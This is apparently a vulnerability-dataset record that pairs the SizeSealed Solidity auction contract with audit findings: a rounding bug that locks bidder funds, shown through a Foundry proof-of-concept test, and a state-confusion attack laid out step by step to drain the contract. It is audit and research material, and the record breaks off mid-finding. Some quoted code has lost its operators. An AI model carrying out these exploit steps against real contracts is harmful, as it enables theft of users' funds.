[
    {
        "Code": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.17;\n\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\nimport {MerkleProofLib} from \"solmate/utils/MerkleProofLib.sol\";\nimport {SafeTransferLib} from \"solmate/utils/SafeTransferLib.sol\";\nimport {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\n\nimport {ECCMath} from \"./util/ECCMath.sol\";\nimport {ISizeSealed} from \"./interfaces/ISizeSealed.sol\";\nimport {CommonTokenMath} from \"./util/CommonTokenMath.sol\";\n\n/// @title Size Sealed Auction\n/// @author Size Market\ncontract SizeSealed is ISizeSealed {\n    ///////////////////////////////\n    ///          STATE          ///\n    ///////////////////////////////\n\n    uint256 public currentAuctionId;\n\n    mapping(uint256 => Auction) public idToAuction;\n\n    ///////////////////////////////////////////////////\n    ///                  MODIFIERS                  ///\n    ///////////////////////////////////////////////////\n\n    modifier atState(Auction storage a, States _state) {\n        if (block.timestamp < a.timings.startTimestamp) {\n            if (_state != States.Created) revert InvalidState();\n        } else if (block.timestamp < a.timings.endTimestamp) {\n            if (_state != States.AcceptingBids) revert InvalidState();\n        } else if (a.data.lowestQuote != type(uint128).max) {\n            if (_state != States.Finalized) revert InvalidState();\n        } else if (block.timestamp <= a.timings.endTimestamp + 24 hours) {\n            if (_state != States.RevealPeriod) revert InvalidState();\n        } else if (block.timestamp > a.timings.endTimestamp + 24 hours) {\n            if (_state != States.Voided) revert InvalidState();\n        } else {\n            revert();\n        }\n        _;\n    }\n\n    ///////////////////////////////////////////////////////////////////////\n    ///                          AUCTION LOGIC                          ///\n    ///////////////////////////////////////////////////////////////////////\n\n    /// @notice Creates a new sealed auction\n    /// @dev Transfers the `baseToken` from `msg.sender` to the contract\n    /// @return `auctionId` unique to that auction\n    /// @param auctionParams Parameters used during the auction\n    /// @param timings The timestamps at which the auction starts/ends\n    /// @param encryptedSellerPrivKey Encrypted seller's ephemeral private key\n    function createAuction(\n        AuctionParameters calldata auctionParams,\n        Timings calldata timings,\n        bytes calldata encryptedSellerPrivKey\n    ) external returns (uint256) {\n        if (timings.endTimestamp <= block.timestamp) {\n            revert InvalidTimestamp();\n        }\n        if (timings.startTimestamp >= timings.endTimestamp) {\n            revert InvalidTimestamp();\n        }\n        if (timings.endTimestamp > timings.vestingStartTimestamp) {\n            revert InvalidTimestamp();\n        }\n        if (timings.vestingStartTimestamp > timings.vestingEndTimestamp) {\n            revert InvalidTimestamp();\n        }\n        if (timings.cliffPercent > 1e18) {\n            revert InvalidCliffPercent();\n        }\n        // Revert if the min bid is more than the total reserve of the auction\n        if (\n            FixedPointMathLib.mulDivDown(\n                auctionParams.minimumBidQuote, type(uint128).max, auctionParams.totalBaseAmount\n            ) > auctionParams.reserveQuotePerBase\n        ) {\n            revert InvalidReserve();\n        }\n\n        uint256 auctionId = ++currentAuctionId;\n\n        Auction storage a = idToAuction[auctionId];\n        a.timings = timings;\n\n        a.data.seller = msg.sender;\n        a.data.lowestQuote = type(uint128).max;\n\n        a.params = auctionParams;\n\n        // Passes https://github.com/transmissions11/solmate/blob/main/src/utils/SafeTransferLib.sol#L9\n        // Transfer base tokens to auction contract and check for tax tokens\n        uint256 balanceBeforeTransfer = ERC20(auctionParams.baseToken).balanceOf(address(this));\n\n        SafeTransferLib.safeTransferFrom(\n            ERC20(auctionParams.baseToken), msg.sender, address(this), auctionParams.totalBaseAmount\n        );\n\n        uint256 balanceAfterTransfer = ERC20(auctionParams.baseToken).balanceOf(address(this));\n        if (balanceAfterTransfer - balanceBeforeTransfer != auctionParams.totalBaseAmount) {\n            revert UnexpectedBalanceChange();\n        }\n\n        emit AuctionCreated(auctionId, msg.sender, auctionParams, timings, encryptedSellerPrivKey);\n\n        return auctionId;\n    }\n\n    /// @notice Bid on a runnning auction\n    /// @dev Transfers `quoteAmount` of `quoteToken` from bidder to contract\n    /// @return Index of the bid\n    /// @param auctionId Id of the auction to bid on\n    /// @param quoteAmount Amount of `quoteTokens` bidding on a committed amount of `baseTokens`\n    /// @param commitment Hash commitment of the `baseAmount`\n    /// @param pubKey Public key used to encrypt `baseAmount`\n    /// @param encryptedMessage `baseAmount` encrypted to the seller's public key\n    /// @param encryptedPrivateKey Encrypted private key for on-chain storage\n    /// @param proof Merkle proof that checks seller against `merkleRoot` if there is a whitelist\n    function bid(\n        uint256 auctionId,\n        uint128 quoteAmount,\n        bytes32 commitment,\n        ECCMath.Point calldata pubKey,\n        bytes32 encryptedMessage,\n        bytes calldata encryptedPrivateKey,\n        bytes32[] calldata proof\n    ) external atState(idToAuction[auctionId], States.AcceptingBids) returns (uint256) {\n        Auction storage a = idToAuction[auctionId];\n        if (a.params.merkleRoot != bytes32(0)) {\n            bytes32 leaf = keccak256(abi.encodePacked(msg.sender));\n            if (!MerkleProofLib.verify(proof, a.params.merkleRoot, leaf)) {\n                revert InvalidProof();\n            }\n        }\n\n        // Seller cannot bid on their own auction\n        if (msg.sender == a.data.seller) {\n            revert UnauthorizedCaller();\n        }\n\n        if (quoteAmount == 0 || quoteAmount == type(uint128).max || quoteAmount < a.params.minimumBidQuote) {\n            revert InvalidBidAmount();\n        }\n\n        EncryptedBid memory ebid;\n        ebid.sender = msg.sender;\n        ebid.quoteAmount = quoteAmount;\n        ebid.commitment = commitment;\n        ebid.pubKey = pubKey;\n        ebid.encryptedMessage = encryptedMessage;\n\n        uint256 bidIndex = a.bids.length;\n        // Max of 1000 bids on an auction to prevent DOS\n        if (bidIndex >= 1000) {\n            revert InvalidState();\n        }\n\n        a.bids.push(ebid);\n\n        SafeTransferLib.safeTransferFrom(ERC20(a.params.quoteToken), msg.sender, address(this), quoteAmount);\n\n        emit Bid(\n            msg.sender, auctionId, bidIndex, quoteAmount, commitment, pubKey, encryptedMessage, encryptedPrivateKey\n        );\n\n        return bidIndex;\n    }\n\n    /// @notice Reveals the private key of the seller\n    /// @dev All valid bids are decrypted after this\n    ///      finalizeData should be empty if seller does not wish to finalize in this tx\n    /// @param privateKey Private key corresponding to the auctions public key\n    /// @param finalizeData Calldata that will be sent to finalize()\n    function reveal(uint256 auctionId, uint256 privateKey, bytes calldata finalizeData)\n        external\n        atState(idToAuction[auctionId], States.RevealPeriod)\n    {\n        Auction storage a = idToAuction[auctionId];\n        if (a.data.seller != msg.sender) {\n            revert UnauthorizedCaller();\n        }\n\n        ECCMath.Point memory pubKey = ECCMath.publicKey(privateKey);\n        if (pubKey.x != a.params.pubKey.x || pubKey.y != a.params.pubKey.y || (pubKey.x == 1 && pubKey.y == 1)) {\n            revert InvalidPrivateKey();\n        }\n\n        a.data.privKey = privateKey;\n\n        emit RevealedKey(auctionId, privateKey);\n\n        if (finalizeData.length != 0) {\n            (uint256[] memory bidIndices, uint128 clearingBase, uint128 clearingQuote) =\n                abi.decode(finalizeData, (uint256[], uint128, uint128));\n            finalize(auctionId, bidIndices, clearingBase, clearingQuote);\n        }\n    }\n\n    // Used to get around stack too deep errors -- even with viaIr\n    struct FinalizeData {\n        uint256 reserveQuotePerBase;\n        uint128 totalBaseAmount;\n        uint128 filledBase;\n        uint256 previousQuotePerBase;\n        uint256 previousIndex;\n    }\n\n    /// @notice Finalises an auction by revealing all bids\n    /// @dev Calculates the minimum `quotePerBase` and marks successful bids\n    /// @param auctionId `auctionId` of the auction to bid on\n    /// @param bidIndices Bids sorted by price descending\n    /// @param clearingBase Denominator in the clearing price calculation\n    /// @param clearingQuote Numerator in the clearing price calculation\n    function finalize(uint256 auctionId, uint256[] memory bidIndices, uint128 clearingBase, uint128 clearingQuote)\n        public\n        atState(idToAuction[auctionId], States.RevealPeriod)\n    {\n        Auction storage a = idToAuction[auctionId];\n        uint256 sellerPriv = a.data.privKey;\n        if (sellerPriv == 0) {\n            revert InvalidPrivateKey();\n        }\n\n        if (bidIndices.length != a.bids.length) {\n            revert InvalidCalldata();\n        }\n\n        FinalizeData memory data;\n        data.reserveQuotePerBase = a.params.reserveQuotePerBase;\n        data.totalBaseAmount = a.params.totalBaseAmount;\n        data.previousQuotePerBase = type(uint256).max;\n\n        // Last filled bid is the clearing price\n        a.data.lowestBase = clearingBase;\n        a.data.lowestQuote = clearingQuote;\n\n        // Bitmap of all the bid indices that have been processed\n        uint256[] memory seenBidMap = new uint256[]((bidIndices.length/256)+1);\n\n        // Fill orders from highest price to lowest price\n        for (uint256 i; i < bidIndices.length; i++) {\n            uint256 bidIndex = bidIndices[i];\n            EncryptedBid storage b = a.bids[bidIndex];\n\n            // Verify this bid index hasn't been seen before\n            uint256 bitmapIndex = bidIndex / 256;\n            uint256 bitMap = seenBidMap[bitmapIndex];\n            uint256 indexBit = 1 << (bidIndex % 256);\n            if (bitMap & indexBit == 1) revert InvalidState();\n            seenBidMap[bitmapIndex] = bitMap | indexBit;\n\n            // G^k1^k2 == G^k2^k1\n            ECCMath.Point memory sharedPoint = ECCMath.ecMul(b.pubKey, sellerPriv);\n            // If the bidder public key isn't on the bn128 curve\n            if (sharedPoint.x == 1 && sharedPoint.y == 1) continue;\n\n            bytes32 decryptedMessage = ECCMath.decryptMessage(sharedPoint, b.encryptedMessage);\n            // If the bidder didn't faithfully submit commitment or pubkey\n            // Or the bid was cancelled\n            if (computeCommitment(decryptedMessage) != b.commitment) continue;\n\n            // First 128 bits are the base amount, last are random salt\n            uint128 baseAmount = uint128(uint256(decryptedMessage >> 128));\n\n            // Require that bids are passed in descending price\n            uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount);\n            if (quotePerBase >= data.previousQuotePerBase) {\n                // If last bid was the same price, make sure we filled the earliest bid first\n                if (quotePerBase == data.previousQuotePerBase) {\n                    if (data.previousIndex > bidIndex) revert InvalidSorting();\n                } else {\n                    revert InvalidSorting();\n                }\n            }\n\n            // Only fill if above reserve price\n            if (quotePerBase < data.reserveQuotePerBase) continue;\n\n            // Auction has been fully filled\n            if (data.filledBase == data.totalBaseAmount) continue;\n\n            data.previousQuotePerBase = quotePerBase;\n            data.previousIndex = bidIndex;\n\n            // Fill the remaining unfilled base amount\n            if (data.filledBase + baseAmount > data.totalBaseAmount) {\n                baseAmount = data.totalBaseAmount - data.filledBase;\n            }\n\n            b.filledBaseAmount = baseAmount;\n            data.filledBase += baseAmount;\n        }\n\n        if (data.previousQuotePerBase != FixedPointMathLib.mulDivDown(clearingQuote, type(uint128).max, clearingBase)) {\n            revert InvalidCalldata();\n        }\n\n        // seenBidMap[0:len-1] should be full\n        for (uint256 i; i < seenBidMap.length - 1; i++) {\n            if (seenBidMap[i] != type(uint256).max) {\n                revert InvalidState();\n            }\n        }\n\n        // seenBidMap[-1] should only have the last N bits set\n        if (seenBidMap[seenBidMap.length - 1] != (1 << (bidIndices.length % 256)) - 1) {\n            revert InvalidState();\n        }\n\n        if (data.filledBase > data.totalBaseAmount) {\n            revert InvalidState();\n        }\n\n        // Transfer the left over baseToken\n        if (data.totalBaseAmount != data.filledBase) {\n            uint128 unsoldBase = data.totalBaseAmount - data.filledBase;\n            a.params.totalBaseAmount = data.filledBase;\n            SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), a.data.seller, unsoldBase);\n        }\n\n        // Calculate quote amount based on clearing price\n        uint256 filledQuote = FixedPointMathLib.mulDivDown(clearingQuote, data.filledBase, clearingBase);\n\n        SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), a.data.seller, filledQuote);\n\n        emit AuctionFinalized(auctionId, bidIndices, data.filledBase, filledQuote);\n    }\n\n    /// @notice Called after finalize for unsuccessful bidders to return funds\n    /// @dev Returns all `quoteToken` to the original bidder\n    /// @param auctionId `auctionId` of the auction to bid on\n    /// @param bidIndex Index of the failed bid to be refunded\n    function refund(uint256 auctionId, uint256 bidIndex) external atState(idToAuction[auctionId], States.Finalized) {\n        Auction storage a = idToAuction[auctionId];\n        EncryptedBid storage b = a.bids[bidIndex];\n        if (msg.sender != b.sender) {\n            revert UnauthorizedCaller();\n        }\n\n        if (b.filledBaseAmount != 0) {\n            revert InvalidState();\n        }\n\n        b.sender = address(0);\n\n        emit BidRefund(auctionId, bidIndex);\n\n        SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), msg.sender, b.quoteAmount);\n    }\n\n    /// @notice Called after finalize for successful bidders\n    /// @dev Returns won `baseToken` & any unfilled `quoteToken` to the bidder\n    /// @param auctionId `auctionId` of the auction bid on\n    /// @param bidIndex Index of the successful bid\n    function withdraw(uint256 auctionId, uint256 bidIndex) external atState(idToAuction[auctionId], States.Finalized) {\n        Auction storage a = idToAuction[auctionId];\n        EncryptedBid storage b = a.bids[bidIndex];\n        if (msg.sender != b.sender) {\n            revert UnauthorizedCaller();\n        }\n\n        uint128 baseAmount = b.filledBaseAmount;\n        if (baseAmount == 0) {\n            revert InvalidState();\n        }\n\n        uint128 baseTokensAvailable = tokensAvailableForWithdrawal(auctionId, baseAmount);\n        baseTokensAvailable = baseTokensAvailable - b.baseWithdrawn;\n\n        b.baseWithdrawn += baseTokensAvailable;\n\n        // Refund unfilled quoteAmount on first withdraw\n        if (b.quoteAmount != 0) {\n            uint256 quoteBought = FixedPointMathLib.mulDivDown(baseAmount, a.data.lowestQuote, a.data.lowestBase);\n            uint256 refundedQuote = b.quoteAmount - quoteBought;\n            b.quoteAmount = 0;\n\n            SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), msg.sender, refundedQuote);\n        }\n\n        SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), msg.sender, baseTokensAvailable);\n\n        emit Withdrawal(auctionId, bidIndex, baseTokensAvailable, baseAmount - b.baseWithdrawn);\n    }\n\n    /// @dev Transfers `baseToken` back to seller and will enable withdraws for bidders\n    /// @param auctionId `auctionId` of the auction to be cancelled\n    function cancelAuction(uint256 auctionId) external {\n        Auction storage a = idToAuction[auctionId];\n        if (msg.sender != a.data.seller) {\n            revert UnauthorizedCaller();\n        }\n        // Only allow cancellations before finalization\n        // Equivalent to atState(idToAuction[auctionId], ~STATE_FINALIZED)\n        if (a.data.lowestQuote != type(uint128).max) {\n            revert InvalidState();\n        }\n\n        // Allowing bidders to cancel bids (withdraw quote)\n        // Auction considered forever States.AcceptingBids but nobody can finalize\n        a.data.seller = address(0);\n        a.timings.endTimestamp = type(uint32).max;\n\n        emit AuctionCancelled(auctionId);\n\n        SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), msg.sender, a.params.totalBaseAmount);\n    }\n\n    /// @dev Transfers `quoteToken` back to bidder and prevents bid from being finalised\n    /// @param auctionId `auctionId` of the auction to be cancelled\n    /// @param bidIndex Index of the bid to be cancelled\n    function cancelBid(uint256 auctionId, uint256 bidIndex)\n        external\n    {\n        Auction storage a = idToAuction[auctionId];\n        EncryptedBid storage b = a.bids[bidIndex];\n        if (msg.sender != b.sender) {\n            revert UnauthorizedCaller();\n        }\n\n        // Only allow bid cancellations while not finalized or in the reveal period\n        if (block.timestamp >= a.timings.endTimestamp) {\n            if (a.data.lowestQuote != type(uint128).max || block.timestamp <= a.timings.endTimestamp + 24 hours) {\n                revert InvalidState();\n            }\n        }\n\n        // Prevent any futher access to this EncryptedBid\n        b.sender = address(0);\n\n        // Prevent seller from finalizing a cancelled bid\n        b.commitment = 0;\n\n        emit BidCancelled(auctionId, bidIndex);\n\n        SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), msg.sender, b.quoteAmount);\n    }\n\n    ////////////////////////////////////////////////////////////////////////////\n    ///                            UTIL FUNCTIONS                            ///\n    ////////////////////////////////////////////////////////////////////////////\n\n    /// @notice Calculates available unlocked tokens for an auction\n    /// @dev Uses vesting parameters to account for cliff & linearity\n    /// @return tokensAvailable Amount of unlocked `baseToken` at the current time\n    /// @param auctionId `auctionId` of the auction bid on\n    /// @param baseAmount Amount of total vested `baseToken`\n    function tokensAvailableForWithdrawal(uint256 auctionId, uint128 baseAmount)\n        public\n        view\n        returns (uint128 tokensAvailable)\n    {\n        Auction storage a = idToAuction[auctionId];\n        return CommonTokenMath.tokensAvailableAtTime(\n            a.timings.vestingStartTimestamp,\n            a.timings.vestingEndTimestamp,\n            uint32(block.timestamp),\n            a.timings.cliffPercent,\n            baseAmount\n        );\n    }\n\n    function computeCommitment(bytes32 message) public pure returns (bytes32) {\n        return keccak256(abi.encode(message));\n    }\n\n    function computeMessage(uint128 baseAmount, bytes16 salt) external pure returns (bytes32) {\n        return bytes32(abi.encodePacked(baseAmount, salt));\n    }\n\n    function getTimings(uint256 auctionId) external view returns (Timings memory timings) {\n        timings = idToAuction[auctionId].timings;\n    }\n\n    function getAuctionData(uint256 auctionId) external view returns (AuctionData memory data) {\n        data = idToAuction[auctionId].data;\n    }\n}\n\n\n",
        "CodeNames": [
            "SizeSealed.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-01",
                "Location": [
                    "//solidity\n    // Calculate quote amount based on clearing price\n    uint256 filledQuote = FixedPointMathLib.mulDivDown(clearingQuote, data.filledBase, clearingBase);\n",
                    "//solidity\n    // Refund unfilled quoteAmount on first withdraw\n    if (b.quoteAmount != 0) {\n        uint256 quoteBought = FixedPointMathLib.mulDivDown(baseAmount, a.data.lowestQuote, a.data.lowestBase);\n        uint256 refundedQuote = b.quoteAmount quoteBought;\n        b.quoteAmount = 0;\n\n        SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), msg.sender, refundedQuote);\n    }\n",
                    "//solidity\n    function testAuditBidderMoneyLock() public {\n        // in this scenario, we show that bidder's money can be locked due to inaccurate calculation of claimed quote tokens for a seller\n        uint128 K = 1 ether;\n        baseToSell = 4*K;\n        uint256 aid = seller.createAuction(\n            baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent\n        );\n\n        bidder1.setAuctionId(aid);\n        bidder1.bidOnAuctionWithSalt(3*K, 3*K+2, \"Honest bidder\");\n        bidder2.setAuctionId(aid);\n        bidder2.bidOnAuctionWithSalt(2*K, 2*K+1, \"Honest bidder\");\n\n        vm.warp(endTime);\n\n        uint256[] memory bidIndices = new uint[(2);\n        bidIndices[0] = 0;\n        bidIndices[1] = 1;\n\n        seller.finalize(bidIndices, 2*K, 2*K+1);\n        emit log_string(\"Seller claimed\");\n        // seller claimed 4*K+2\n        assertEq(quoteToken.balanceOf(address(seller)), 4*K+2);\n        // contract has K+1 quote token left\n        assertEq(quoteToken.balanceOf(address(auction)), K+1);\n\n        // bidder1 withdraws\n        bidder1.withdraw();\n        emit log_string(\"Bidder 1 withdrew\");\n        // contract has K quote token left\n        assertEq(quoteToken.balanceOf(address(auction)), K);\n        // bidder2 withdraws and he is supposed to be able to claim K+1 quote tokens\n        // but the protocol reverts because of insufficient quote tokens\n        bidder2.withdraw();\n        emit log_string(\"Bidder 2 withdrew\"); // will not happen\n    }\n",
                    "//solidity\n    Running 1 test for src/test/SizeSealed.t.sol:SizeSealedTest\n    FAIL. Reason: TRANSFER_FAILED] testAuditBidderMoneyLock() (gas: 954985)\n    Logs:\n    Seller claimed\n    Bidder 1 withdrew\n\n    Test result: FAILED. 0 passed; 1 failed; finished in 6.94ms\n\n    Failing tests:\n    Encountered 1 failing test in src/test/SizeSealed.t.sol:SizeSealedTest\n    FAIL. Reason: TRANSFER_FAILED] testAuditBidderMoneyLock() (gas: 954985)\n"
                ],
                "Type": " Bidders might fail to withdraw their unused funds after the auction was finalized because the contract doesn't have enough balance.",
                "Description": "*Submitted by hansfriese(https://github.com/code-423n4/2022-11-size-findings/issues/94), also found by ktg(https://github.com/code-423n4/2022-11-size-findings/issues/144)*\n\nBidders might fail to withdraw their unused funds after the auction was finalized because the contract doesn't have enough balance.\n\nThe main flaw is the seller might receive more quote tokens than the bidders offer after the auction was finalized.\n\nIf there is no other auctions to use the same quote token, the last bidder will fail to withdraw his funds because the contract doesn't have enough balance of quote token.\n\n\nAfter the auction was finalized, the seller receives the filledQuote amount of quote token using data.filledBase(https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L325).\n\nsolidity\n    // Calculate quote amount based on clearing price\n    uint256 filledQuote = FixedPointMathLib.mulDivDown(clearingQuote, data.filledBase, clearingBase);\n\n\nBut when the bidders withdraw the funds using withdraw(), they offer the quote token using this formula(https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L375-L382).\n\nsolidity\n    // Refund unfilled quoteAmount on first withdraw\n    if (b.quoteAmount != 0) {\n        uint256 quoteBought = FixedPointMathLib.mulDivDown(baseAmount, a.data.lowestQuote, a.data.lowestBase);\n        uint256 refundedQuote = b.quoteAmount quoteBought;\n        b.quoteAmount = 0;\n\n        SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), msg.sender, refundedQuote);\n    }\n\n\nEven if they use the same clearing price, the total amount of quote token that the bidders offer might be less than the amount that the seller charged during finalization because the round down would happen several times with the bidders.\n\nThis is the test to show the scenario.\n\nsolidity\n    function testAuditBidderMoneyLock() public {\n        // in this scenario, we show that bidder's money can be locked due to inaccurate calculation of claimed quote tokens for a seller\n        uint128 K = 1 ether;\n        baseToSell = 4*K;\n        uint256 aid = seller.createAuction(\n            baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent\n        );\n\n        bidder1.setAuctionId(aid);\n        bidder1.bidOnAuctionWithSalt(3*K, 3*K+2, \"Honest bidder\");\n        bidder2.setAuctionId(aid);\n        bidder2.bidOnAuctionWithSalt(2*K, 2*K+1, \"Honest bidder\");\n\n        vm.warp(endTime);\n\n        uint256[] memory bidIndices = new uint[(2);\n        bidIndices[0] = 0;\n        bidIndices[1] = 1;\n\n        seller.finalize(bidIndices, 2*K, 2*K+1);\n        emit log_string(\"Seller claimed\");\n        // seller claimed 4*K+2\n        assertEq(quoteToken.balanceOf(address(seller)), 4*K+2);\n        // contract has K+1 quote token left\n        assertEq(quoteToken.balanceOf(address(auction)), K+1);\n\n        // bidder1 withdraws\n        bidder1.withdraw();\n        emit log_string(\"Bidder 1 withdrew\");\n        // contract has K quote token left\n        assertEq(quoteToken.balanceOf(address(auction)), K);\n        // bidder2 withdraws and he is supposed to be able to claim K+1 quote tokens\n        // but the protocol reverts because of insufficient quote tokens\n        bidder2.withdraw();\n        emit log_string(\"Bidder 2 withdrew\"); // will not happen\n    }\n\n\nThe test result shows the seller charged more quote token than the bidders offer so the last bidder can't withdraw his unused quote token because the contract doesn't have enough balance.\n\nsolidity\n    Running 1 test for src/test/SizeSealed.t.sol:SizeSealedTest\n    FAIL. Reason: TRANSFER_FAILED] testAuditBidderMoneyLock() (gas: 954985)\n    Logs:\n    Seller claimed\n    Bidder 1 withdrew\n\n    Test result: FAILED. 0 passed; 1 failed; finished in 6.94ms\n\n    Failing tests:\n    Encountered 1 failing test in src/test/SizeSealed.t.sol:SizeSealedTest\n    FAIL. Reason: TRANSFER_FAILED] testAuditBidderMoneyLock() (gas: 954985)\n\n\n\nFoundry\n\n",
                "Repair": "\nCurrently, the FinalizeData struct contains the filledBase only and calculates the filledQuote using the clearing price.\n\nsolidity\n    struct FinalizeData {\n        uint256 reserveQuotePerBase;\n        uint128 totalBaseAmount;\n        uint128 filledBase;\n        uint256 previousQuotePerBase;\n        uint256 previousIndex;\n    }\n\n\nI think we should add one more field filledQuote and update it during auction finalization.\n\nAnd the seller can recieve the sum of filledQuote of all bidders to avoid the rounding issue.\n\nAlso, each bidder can pay the filledQuote of quote token and receive the filledBase of base token without calculating again using the clearing price.\n\nRagePit (SIZE) confirmed(https://github.com/code-423n4/2022-11-size-findings/issues/94#issuecomment-1319190203)\n\n*\n\n\n"
            },
            {
                "Name": "H-02",
                "Location": [
                    "minimumBidQuote",
                    "type(uint"
                ],
                "Type": " Attacker can steal any funds in the contract by state confusion (no preconditions)",
                "Description": "*Submitted by Trust(https://github.com/code-423n4/2022-11-size-findings/issues/252), also found by V_B(https://github.com/code-423n4/2022-11-size-findings/issues/333), cryptonue(https://github.com/code-423n4/2022-11-size-findings/issues/304), PwnedNoMore(https://github.com/code-423n4/2022-11-size-findings/issues/213), KIntern_NA(https://github.com/code-423n4/2022-11-size-findings/issues/200), fs0c(https://github.com/code-423n4/2022-11-size-findings/issues/171), cryptphi(https://github.com/code-423n4/2022-11-size-findings/issues/164), bin2chen(https://github.com/code-423n4/2022-11-size-findings/issues/141), JTJabba(https://github.com/code-423n4/2022-11-size-findings/issues/134), HE1M(https://github.com/code-423n4/2022-11-size-findings/issues/128), Picodes(https://github.com/code-423n4/2022-11-size-findings/issues/124), hansfriese(https://github.com/code-423n4/2022-11-size-findings/issues/96), KingNFT(https://github.com/code-423n4/2022-11-size-findings/issues/86), R2(https://github.com/code-423n4/2022-11-size-findings/issues/71), M4TZ1P(https://github.com/code-423n4/2022-11-size-findings/issues/46), and 8olidity(https://github.com/code-423n4/2022-11-size-findings/issues/15)*\n\nHIGH: Attacker can steal any funds in the contract by state confusion (no preconditions).<br\nLOC:<br\n<https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L33<br\n<https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L238\n\nAuctions in SIZE can be in one of several states, as checked in the atState() modifier:\n\n    modifier atState(Auction storage a, States _state) {\n        if (block.timestamp < a.timings.startTimestamp) {\n            if (_state != States.Created) revert InvalidState();\n        } else if (block.timestamp < a.timings.endTimestamp) {\n            if (_state != States.AcceptingBids) revert InvalidState();\n        } else if (a.data.lowestQuote != type(uint128).max) {\n            if (_state != States.Finalized) revert InvalidState();\n        } else if (block.timestamp <= a.timings.endTimestamp + 24 hours) {\n            if (_state != States.RevealPeriod) revert InvalidState();\n        } else if (block.timestamp  a.timings.endTimestamp + 24 hours) {\n            if (_state != States.Voided) revert InvalidState();\n        } else {\n            revert();\n        }\n        _;\n    }\n\nIt's important to note that if current block timestamp is greater than endTimestamp, a.data.lowestQuote is used to determine if finalize() was called.\n\nThe value is set to max at createAuction.\nIn finalize, it is set again, using user-controlled input:\n\n    // Last filled bid is the clearing price\n    a.data.lowestBase = clearingBase;\n    a.data.lowestQuote = clearingQuote;\n\nThe issue is that it is possible to break the state machine by calling finalize() and setting lowestQuote to type(uint128).max. If the other parameters are crafted correctly, finalize() will succeed and perform transfers of unsold base amount and traded quote amount:\n\n    // Transfer the left over baseToken\n    if (data.totalBaseAmount != data.filledBase) {\n        uint128 unsoldBase = data.totalBaseAmount data.filledBase;\n        a.params.totalBaseAmount = data.filledBase;\n        SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), a.data.seller, unsoldBase);\n    }\n    // Calculate quote amount based on clearing price\n    uint256 filledQuote = FixedPointMathLib.mulDivDown(clearingQuote, data.filledBase, clearingBase);\n    SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), a.data.seller, filledQuote);\n\nCritically, attacker will later be able to call cancelAuction() and cancelBid(), as they are allowed as long as the auction has not finalized:\n\n    function cancelAuction(uint256 auctionId) external {\n        Auction storage a = idToAuction[auctionId];\n        if (msg.sender != a.data.seller) {\n            revert UnauthorizedCaller();\n        }\n        // Only allow cancellations before finalization\n        // Equivalent to atState(idToAuction[auctionId], ~STATE_FINALIZED)\n        if (a.data.lowestQuote != type(uint128).max) {\n            revert InvalidState();\n        }\n        // Allowing bidders to cancel bids (withdraw quote)\n        // Auction considered forever States.AcceptingBids but nobody can finalize\n        a.data.seller = address(0);\n        a.timings.endTimestamp = type(uint32).max;\n        emit AuctionCancelled(auctionId);\n        SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), msg.sender, a.params.totalBaseAmount);\n    }\n\n    function cancelBid(uint256 auctionId, uint256 bidIndex)\n        external\n    {\n        Auction storage a = idToAuction[auctionId];\n        EncryptedBid storage b = a.bids[bidIndex];\n        if (msg.sender != b.sender) {\n            revert UnauthorizedCaller();\n        }\n        // Only allow bid cancellations while not finalized or in the reveal period\n        if (block.timestamp = a.timings.endTimestamp) {\n            if (a.data.lowestQuote != type(uint128).max || block.timestamp <= a.timings.endTimestamp + 24 hours) {\n                revert InvalidState();\n            }\n        }\n        // Prevent any futher access to this EncryptedBid\n        b.sender = address(0);\n        // Prevent seller from finalizing a cancelled bid\n        b.commitment = 0;\n        emit BidCancelled(auctionId, bidIndex);\n        SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), msg.sender, b.quoteAmount);\n    }\n\nThe attack will look as follows:\n\n1.  attacker uses two contracts buyer and seller\n2.  seller creates an auction, with no vesting period and ends in 1 second. Passes X base tokens.\n3.  buyer bids on the auction, using baseAmount=quoteAmount (ratio is 1:1). Passes Y quote tokens, where Y < X.\n4.  after 1 second, seller calls reveal() and finalizes, with lowestQuote = lowestBase = 2&ast;&ast;128-1.\n5.  seller contract receives X-Y unsold base tokens and Y quote tokens\n6.  seller calls cancelAuction(). They are sent back remaining totalBaseAmount, which is X (X-Y) = Y base tokens. They now have the same amount of base tokens they started with. cancelAuction sets endTimestamp = type(uint32).max\n7.  buyer calls cancelBid. Because endTimestamp is set to max, the call succeeds. Buyer gets back Y quote tokens.\n8.  The accounting shows attacker profited Y quote tokens, which are both in buyer and seller's contract.\n\nNote that the values of minimumBidQuote, reserveQuotePerbase must be carefully chosen to satisfy all the inequality requirements in createAuction(), bid() and finalize(). This is why merely spotting that lowestQuote may be set to max in finalize is not enough and in my opinion, POC-ing the entire flow is necessary for a valid finding.\n\nThis was the main constraint to bypass:\n\n    uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount);\n    ...\n    data.previousQuotePerBase = quotePerBase;\n    ...\n    if 